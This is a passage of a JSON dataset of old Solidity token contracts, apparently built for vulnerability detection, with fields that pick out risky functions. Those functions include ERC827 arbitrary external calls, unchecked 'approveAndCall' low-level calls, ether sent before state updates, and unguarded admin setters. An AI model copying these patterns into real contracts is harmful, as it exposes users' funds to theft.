    "function buyNac(address _seller, uint _price) payable public returns (bool success) {\nrequire(msg.value > 0 && ask[_seller].volume > 0 && ask[_seller].price > 0);\nrequire(_price == ask[_seller].price && _seller != msg.sender);\nNamiCrowdSale namiToken = NamiCrowdSale(NamiAddr);\nuint maxEth = (ask[_seller].volume).div(ask[_seller].price);\nuint previousBalances = namiToken.balanceOf(msg.sender);\nif (msg.value > maxEth) {\nif (_seller.send(maxEth) && msg.sender.send(msg.value.sub(maxEth))) {\nnamiToken.transfer(msg.sender, ask[_seller].volume);\nSellHistory(_seller, msg.sender, ask[_seller].price, ask[_seller].volume, now);\nask[_seller].volume = 0;\nUpdateAsk(_seller, ask[_seller].price, 0);\nassert(previousBalances < namiToken.balanceOf(msg.sender));\nreturn true;\n} else {\nrevert();\n}\n} else {\nuint nac = (msg.value).mul(ask[_seller].price);\nif (_seller.send(msg.value)) {\nnamiToken.transfer(msg.sender, nac);\nask[_seller].volume = (ask[_seller].volume).sub(nac);\nUpdateAsk(_seller, ask[_seller].price, ask[_seller].volume);\nSellHistory(_seller, msg.sender, ask[_seller].price, nac, now);\nassert(previousBalances < namiToken.balanceOf(msg.sender));\nreturn true;\n} else {\nrevert();\n}\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1448"
  },
  "filename": "21196.sol",
  "content": "pragma solidity ^0.4.19;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract Pausable is Ownable {\n event Pause();\n event Unpause();\n bool public paused = false;\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused() {\n require(paused);\n _;\n }\n function pause() onlyOwner whenNotPaused public {\n paused = true;\n Pause();\n }\n function unpause() onlyOwner whenPaused public {\n paused = false;\n Unpause();\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract ERC827 is ERC20 {\n function approve( address _spender, uint256 _value, bytes _data ) public returns (bool);\n function transfer( address _to, uint256 _value, bytes _data ) public returns (bool);\n function transferFrom( address _from, address _to, uint256 _value, bytes _data ) public returns (bool);\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract ERC827Token is ERC827, StandardToken {\n function approve(address _spender, uint256 _value, bytes _data) public returns (bool) {\n require(_spender != address(this));\n super.approve(_spender, _value);\n require(_spender.call(_data));\n return true;\n }\n function transfer(address _to, uint256 _value, bytes _data) public returns (bool) {\n require(_to != address(this));\n super.transfer(_to, _value);\n require(_to.call(_data));\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value, bytes _data) public returns (bool) {\n require(_to != address(this));\n super.transferFrom(_from, _to, _value);\n require(_to.call(_data));\n return true;\n }\n function increaseApproval(address _spender, uint _addedValue, bytes _data) public returns (bool) {\n require(_spender != address(this));\n super.increaseApproval(_spender, _addedValue);\n require(_spender.call(_data));\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue, bytes _data) public returns (bool) {\n require(_spender != address(this));\n super.decreaseApproval(_spender, _subtractedValue);\n require(_spender.call(_data));\n return true;\n }\n}\ncontract JOYToken is Pausable, ERC827Token {\n string public constant name = \"BLOCK JOY\";\n string public constant symbol = \"JOY\";\n uint256 public constant decimals = 18;\n uint256 public constant exchangeRatio = 10000;\n uint256 public constant sellCut = 1000;\n uint256 public incomeFees;\n address public cfoAddress;\n event Buy(address indexed buyer, uint256 ethAmount, uint256 tokenAmount);\n event Sell(address indexed seller, uint256 tokenAmount, uint256 ethAmount);\n function JOYToken() public {\n cfoAddress = msg.sender;\n }\n function sell(uint256 _tokenCount) external {\n require(_tokenCount > 0);\n require(_tokenCount <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_tokenCount);\n totalSupply_ = totalSupply_.sub(_tokenCount);\n Transfer(msg.sender, 0x0, _tokenCount);\n uint256 value = _tokenCount.div(exchangeRatio);\n uint256 cut = value.div(sellCut);\n value = value.sub(cut);\n Sell(msg.sender, _tokenCount, value);\n if (cut > 0) {\n incomeFees = incomeFees.add(cut);\n }\n if (value > 0) {\n msg.sender.transfer(value);\n }\n }\n function setCFO(address _newCFO) external onlyOwner {\n require(_newCFO != address(0));\n cfoAddress = _newCFO;\n }\n modifier onlyCFO() {\n require(msg.sender == cfoAddress);\n _;\n }\n function withdrawFees(uint256 _value) external onlyCFO {\n require(_value <= incomeFees);\n incomeFees = incomeFees.sub(_value);\n cfoAddress.transfer(_value);\n }\n function() external payable whenNotPaused {\n require(msg.value > 0);\n uint256 _count = msg.value;\n uint256 tokenCount = _count.mul(exchangeRatio);\n totalSupply_ = totalSupply_.add(tokenCount);\n balances[msg.sender] = balances[msg.sender].add(tokenCount);\n Buy(msg.sender, _count, tokenCount);\n Transfer(0x0, msg.sender, tokenCount);\n }\n}",
  "extract_feature": [
    "function approve(address _spender, uint256 _value, bytes _data) public returns (bool) {\nrequire(_spender != address(this));\nsuper.approve(_spender, _value);\nrequire(_spender.call(_data));\nreturn true;\n}",
    "function transfer(address _to, uint256 _value, bytes _data) public returns (bool) {\nrequire(_to != address(this));\nsuper.transfer(_to, _value);\nrequire(_to.call(_data));\nreturn true;\n}",
    "function transferFrom(address _from, address _to, uint256 _value, bytes _data) public returns (bool) {\nrequire(_to != address(this));\nsuper.transferFrom(_from, _to, _value);\nrequire(_to.call(_data));\nreturn true;\n}",
    "function increaseApproval(address _spender, uint _addedValue, bytes _data) public returns (bool) {\nrequire(_spender != address(this));\nsuper.increaseApproval(_spender, _addedValue);\nrequire(_spender.call(_data));\nreturn true;\n}",
    "function decreaseApproval(address _spender, uint _subtractedValue, bytes _data) public returns (bool) {\nrequire(_spender != address(this));\nsuper.decreaseApproval(_spender, _subtractedValue);\nrequire(_spender.call(_data));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1449"
  },
  "filename": "21277.sol",
  "content": "pragma solidity ^0.4.21;\ncontract Managed {\n event Commission(uint256 basisPoint);\n address public manager;\n uint256 public commission;\n function Managed() public {\n manager = msg.sender;\n }\n function() public payable {}\n function setCommission(uint256 _commission) external {\n require(_commission < 10000);\n commission = _commission;\n emit Commission(commission);\n }\n function withdrawBalance() external {\n manager.transfer(address(this).balance);\n }\n function transferPower(address _newManager) external onlyManager {\n manager = _newManager;\n }\n function callFor(address _to, uint256 _value, uint256 _gas, bytes _code)\n external\n payable\n onlyManager\n returns (bool)\n {\n return _to.call.value(_value).gas(_gas)(_code);\n }\n modifier onlyManager\n {\n require(msg.sender == manager);\n _;\n }\n}\ncontract EthernameRaw is Managed {\n event Transfer(\n address indexed from,\n address indexed to,\n bytes32 indexed name\n );\n event Approval(\n address indexed owner,\n address indexed approved,\n bytes32 indexed name\n );\n event SendEther(\n address indexed from,\n address indexed to,\n bytes32 sender,\n bytes32 recipient,\n uint256 value\n );\n event Name(address indexed owner, bytes32 indexed name);\n event Price(bytes32 indexed name, uint256 price);\n event Buy(bytes32 indexed name, address buyer, uint256 price);\n event Attribute(bytes32 indexed name, bytes32 key);\n struct Record {\n address owner;\n uint256 price;\n mapping (bytes32 => bytes) attrs;\n }\n string public constant name = \"Ethername\";\n string public constant symbol = \"ENM\";\n mapping (address => bytes32) public ownerToName;\n mapping (bytes32 => Record) public nameToRecord;\n mapping (bytes32 => address) public nameToApproved;\n function rawRegister(bytes32 _name) public payable {\n _register(_name, msg.sender);\n }\n function rawTransfer(address _to, bytes32 _name)\n public\n onlyOwner(msg.sender, _name)\n {\n _transfer(msg.sender, _to, _name);\n }\n function rawApprove(address _to, bytes32 _name)\n public\n onlyOwner(msg.sender, _name)\n {\n _approve(msg.sender, _to, _name);\n }\n function rawTransferFrom(address _from, address _to, bytes32 _name)\n public\n onlyOwner(_from, _name)\n onlyApproved(msg.sender, _name)\n {\n _transfer(_from, _to, _name);\n }\n function rawSetPrice(bytes32 _name, uint256 _price)\n public\n onlyOwner(msg.sender, _name)\n {\n require(_price == uint256(uint128(_price)));\n nameToRecord[_name].price = _price;\n emit Price(_name, _price);\n }\n function rawBuy(bytes32 _name) public payable {\n Record memory _record = nameToRecord[_name];\n require(_record.price > 0);\n uint256 _price = _computePrice(_record.price);\n require(msg.value >= _price);\n _record.owner.transfer(_record.price);\n _transfer(_record.owner, msg.sender, _name);\n msg.sender.transfer(msg.value - _price);\n emit Buy(_name, msg.sender, _price);\n }\n function rawUseName(bytes32 _name) public onlyOwner(msg.sender, _name) {\n _useName(msg.sender, _name);\n }\n function rawSetAttribute(bytes32 _name, bytes32 _key, bytes _value)\n public\n onlyOwner(msg.sender, _name)\n {\n nameToRecord[_name].attrs[_key] = _value;\n emit Attribute(_name, _key);\n }\n function rawWipeAttributes(bytes32 _name, bytes32[] _keys)\n public\n onlyOwner(msg.sender, _name)\n {\n mapping (bytes32 => bytes) attrs = nameToRecord[_name].attrs;\n for (uint i = 0; i < _keys.length; i++) {\n delete attrs[_keys[i]];\n emit Attribute(_name, _keys[i]);\n }\n }\n function rawSendEther(bytes32 _name) public payable returns (bool _result) {\n address _to = nameToRecord[_name].owner;\n _result = (_name != bytes32(0)) &&\n (_to != address(0)) &&\n _to.send(msg.value);\n if (_result) {\n emit SendEther(\n msg.sender,\n _to,\n rawNameOf(msg.sender),\n _name,\n msg.value\n );\n }\n }\n function rawNameOf(address _address) public view returns (bytes32 _name) {\n _name = ownerToName[_address];\n }\n function rawOwnerOf(bytes32 _name) public view returns (address _owner) {\n _owner = nameToRecord[_name].owner;\n }\n function rawDetailsOf(bytes32 _name, bytes32 _key)\n public\n view\n returns (address _owner, uint256 _price, bytes _value)\n {\n _owner = nameToRecord[_name].owner;\n _price = _computePrice(nameToRecord[_name].price);\n _value = nameToRecord[_name].attrs[_key];\n }\n function _register(bytes32 _name, address _to) internal {\n require(nameToRecord[_name].owner == address(0));\n for (uint i = 0; i < _name.length; i++) {\n require((_name[i] == 0) ||\n (_name[i] > 96 && _name[i] < 123) ||\n (_name[i] > 47 && _name[i] < 58));\n }\n _transfer(0, _to, _name);\n }\n function _transfer(address _from, address _to, bytes32 _name) internal {\n address _null = address(0);\n if (nameToApproved[_name] != _null) {\n _approve(_from, _null, _name);\n }\n if (ownerToName[_from] == _name) {\n _useName(_from, 0);\n }\n nameToRecord[_name] = Record(_to, 0);\n if (ownerToName[_to] == bytes32(0)) {\n _useName(_to, _name);\n }\n emit Transfer(_from, _to, _name);\n }\n function _approve(address _owner, address _to, bytes32 _name) internal {\n nameToApproved[_name] = _to;\n emit Approval(_owner, _to, _name);\n }\n function _useName(address _owner, bytes32 _name) internal {\n ownerToName[_owner] = _name;\n emit Name(_owner, _name);\n }\n function _computePrice(uint256 _price) internal view returns (uint256) {\n return _price * (10000 + commission) / 10000;\n }\n function _stringToBytes32(string _string)\n internal\n pure\n returns (bytes32 _bytes32)\n {\n require(bytes(_string).length < 33);\n assembly {\n _bytes32 := mload(add(_string, 0x20))\n }\n }\n function _bytes32ToString(bytes32 _bytes32)\n internal\n pure\n returns (string _string)\n {\n assembly {\n let m := mload(0x40)\n mstore(m, 0x20)\n mstore(add(m, 0x20), _bytes32)\n mstore(0x40, add(m, 0x40))\n _string := m\n }\n }\n modifier onlyOwner(address _claimant, bytes32 _name) {\n require(nameToRecord[_name].owner == _claimant);\n _;\n }\n modifier onlyApproved(address _claimant, bytes32 _name) {\n require(nameToApproved[_name] == _claimant);\n _;\n }\n}\ncontract Ethername is EthernameRaw {\n function Ethername() public {\n commission = 200;\n nameToRecord[bytes32('')] = Record(this, 0);\n _register(bytes32('ethername'), this);\n _register(bytes32('root'), msg.sender);\n }\n function register(string _name) external payable {\n rawRegister(_stringToBytes32(_name));\n }\n function transfer(address _to, string _name) external {\n rawTransfer(_to, _stringToBytes32(_name));\n }\n function approve(address _to, string _name) external {\n rawApprove(_to, _stringToBytes32(_name));\n }\n function transferFrom(address _from, address _to, string _name) external {\n rawTransferFrom(_from, _to, _stringToBytes32(_name));\n }\n function setPrice(string _name, uint256 _price) external {\n rawSetPrice(_stringToBytes32(_name), _price);\n }\n function buy(string _name) external payable {\n rawBuy(_stringToBytes32(_name));\n }\n function useName(string _name) external {\n rawUseName(_stringToBytes32(_name));\n }\n function setAttribute(string _name, string _key, bytes _value) external {\n rawSetAttribute(_stringToBytes32(_name), _stringToBytes32(_key), _value);\n }\n function wipeAttributes(string _name, bytes32[] _keys) external {\n rawWipeAttributes(_stringToBytes32(_name), _keys);\n }\n function sendEther(string _name) external payable returns (bool _result) {\n _result = rawSendEther(_stringToBytes32(_name));\n }\n function nameOf(address _address) external view returns (string _name) {\n _name = _bytes32ToString(rawNameOf(_address));\n }\n function ownerOf(string _name) external view returns (address _owner) {\n _owner = rawOwnerOf(_stringToBytes32(_name));\n }\n function detailsOf(string _name, string _key)\n external\n view\n returns (address _owner, uint256 _price, bytes _value)\n {\n return rawDetailsOf(_stringToBytes32(_name), _stringToBytes32(_key));\n }\n}",
  "extract_feature": [
    "function rawSendEther(bytes32 _name) public payable returns (bool _result) {\naddress _to = nameToRecord[_name].owner;\n_result = (_name != bytes32(0)) &&\n(_to != address(0)) &&\n_to.send(msg.value);\nif (_result) {\nemit SendEther(\nmsg.sender,\n_to,\nrawNameOf(msg.sender),\n_name,\nmsg.value\n);\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb144a"
  },
  "filename": "213.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 100000000.000000000;\n totalSupply = 100000000.000000000;\n name = \"AgaveToken\";\n decimals = 9;\n symbol = \"AGV\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb144b"
  },
  "filename": "21513.sol",
  "content": "pragma solidity ^0.4.16;\ncontract ERC827 {\n function approve( address _spender, uint256 _value, bytes _data ) public returns (bool);\n function transfer( address _to, uint256 _value, bytes _data ) public returns (bool);\n function transferFrom(\n address _from,\n address _to,\n uint256 _value,\n bytes _data\n ) public returns (bool);\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for *;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract ERC827Token is ERC827, StandardToken {\n function approve(address _spender, uint256 _value, bytes _data) public returns (bool) {\n require(_spender != address(this));\n super.approve(_spender, _value);\n require(_spender.call(_data));\n return true;\n }\n function transfer(address _to, uint256 _value, bytes _data) public returns (bool) {\n require(_to != address(this));\n super.transfer(_to, _value);\n require(_to.call(_data));\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value, bytes _data) public returns (bool) {\n require(_to != address(this));\n super.transferFrom(_from, _to, _value);\n require(_to.call(_data));\n return true;\n }\n function increaseApproval(address _spender, uint _addedValue, bytes _data) public returns (bool) {\n require(_spender != address(this));\n super.increaseApproval(_spender, _addedValue);\n require(_spender.call(_data));\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue, bytes _data) public returns (bool) {\n require(_spender != address(this));\n super.decreaseApproval(_spender, _subtractedValue);\n require(_spender.call(_data));\n return true;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract Pausable is Ownable {\n event Pause();\n event Unpause();\n bool public paused = false;\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused() {\n require(paused);\n _;\n }\n function pause() onlyOwner whenNotPaused public {\n paused = true;\n Pause();\n }\n function unpause() onlyOwner whenPaused public {\n paused = false;\n Unpause();\n }\n}\ncontract BurnableToken is BasicToken {\n event Burn(address indexed burner, uint256 value);\n function burn(uint256 _value) public {\n require(_value <= balances[msg.sender]);\n address burner = msg.sender;\n balances[burner] = balances[burner].sub(_value);\n totalSupply_ = totalSupply_.sub(_value);\n Burn(burner, _value);\n }\n}\ncontract PausableToken is BurnableToken, StandardToken, Pausable {\n function transfer(address _to, uint256 _value) public whenNotPaused returns (bool) {\n return super.transfer(_to, _value);\n }\n function transferFrom(address _from, address _to, uint256 _value) public whenNotPaused returns (bool) {\n return super.transferFrom(_from, _to, _value);\n }\n function approve(address _spender, uint256 _value) public whenNotPaused returns (bool) {\n return super.approve(_spender, _value);\n }\n function increaseApproval(address _spender, uint _addedValue) public whenNotPaused returns (bool success) {\n return super.increaseApproval(_spender, _addedValue);\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public whenNotPaused returns (bool success) {\n return super.decreaseApproval(_spender, _subtractedValue);\n }\n}\ncontract MintableToken is PausableToken {\n event Mint(address indexed to, uint256 amount);\n event MintFinished();\n bool public mintingFinished = false;\n modifier canMint() {\n require(!mintingFinished);\n _;\n }\n function mint(address _to, uint256 _amount) onlyOwner canMint public returns (bool) {\n totalSupply_ = totalSupply_.add(_amount);\n balances[_to] = balances[_to].add(_amount);\n Mint(_to, _amount);\n Transfer(address(0), _to, _amount);\n return true;\n }\n function finishMinting() onlyOwner canMint public returns (bool) {\n mintingFinished = true;\n MintFinished();\n return true;\n }\n}\ncontract ShittyToken is Ownable, MintableToken, ERC827Token {\n using SafeMath for *;\n string public constant NAME = \"Shitty Token\";\n string public constant SYMBOL = \"SHIT\";\n uint8 public constant DECIMALS = 18;\n uint256 public constant INITIAL_SUPPLY = 10000 * (10 ** uint256(DECIMALS));\n function TokenUnionToken() public {\n totalSupply_ = INITIAL_SUPPLY;\n balances[msg.sender] = INITIAL_SUPPLY;\n Transfer(0x0, msg.sender, INITIAL_SUPPLY);\n }\n}",
  "extract_feature": [
    "function approve(address _spender, uint256 _value, bytes _data) public returns (bool) {\nrequire(_spender != address(this));\nsuper.approve(_spender, _value);\nrequire(_spender.call(_data));\nreturn true;\n}",
    "function transfer(address _to, uint256 _value, bytes _data) public returns (bool) {\nrequire(_to != address(this));\nsuper.transfer(_to, _value);\nrequire(_to.call(_data));\nreturn true;\n}",
    "function transferFrom(address _from, address _to, uint256 _value, bytes _data) public returns (bool) {\nrequire(_to != address(this));\nsuper.transferFrom(_from, _to, _value);\nrequire(_to.call(_data));\nreturn true;\n}",
    "function increaseApproval(address _spender, uint _addedValue, bytes _data) public returns (bool) {\nrequire(_spender != address(this));\nsuper.increaseApproval(_spender, _addedValue);\nrequire(_spender.call(_data));\nreturn true;\n}",
    "function decreaseApproval(address _spender, uint _subtractedValue, bytes _data) public returns (bool) {\nrequire(_spender != address(this));\nsuper.decreaseApproval(_spender, _subtractedValue);\nrequire(_spender.call(_data));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb144c"
  },
  "filename": "21521.sol",
  "content": "pragma solidity ^0.4.4;\ncontract SUNToken {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract THESUN is SUNToken {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n }\n else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract THESUNCOIN is THESUN {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function SUNCOIN(\n ) {\n balances[msg.sender] = 149600000000000000;\n totalSupply = 149600000000000000;\n name = 'SUNCOIN';\n decimals = 9;\n symbol = 'SUN';\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb144d"
  },
  "filename": "21610.sol",
